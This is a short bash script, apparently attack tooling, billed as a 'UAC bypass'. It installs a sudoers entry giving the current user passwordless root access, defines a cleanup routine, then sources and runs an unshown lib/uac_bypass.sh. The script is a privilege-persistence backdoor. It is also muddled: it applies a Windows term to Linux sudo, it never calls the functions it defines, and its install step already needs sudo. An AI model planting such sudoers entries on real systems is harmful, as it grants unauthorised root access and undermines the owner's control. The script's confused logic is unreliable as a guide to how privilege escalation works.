#!/bin/bash

# Global variable for sudoers file
SUDOERS_FILE=""

# Function to create a sudoers file with UAC bypass
create_sudoers_file() {
    local temp_dir=$(mktemp -d)
    SUDOERS_FILE="$temp_dir/uac_bypass"

    # Add a line to the sudoers file allowing user access without password
    echo "$USER ALL=(ALL) NOPASSWD:ALL" > "$SUDOERS_FILE"

    # Install the sudoers file with the appropriate permissions
    sudo install -m 440 -o root -g root "$SUDOERS_FILE" "/etc/sudoers.d/uac_bypass"

    echo "$SUDOERS_FILE"
}

# Function to clean up temporary files
cleanup() {
    sudo rm -f "/etc/sudoers.d/uac_bypass"
    [ -n "$SUDOERS_FILE" ] && rm -rf "$SUDOERS_FILE"
}

# Source the UAC Bypass script
source lib/uac_bypass.sh

# Call the execute_uac_bypass function
execute_uac_bypass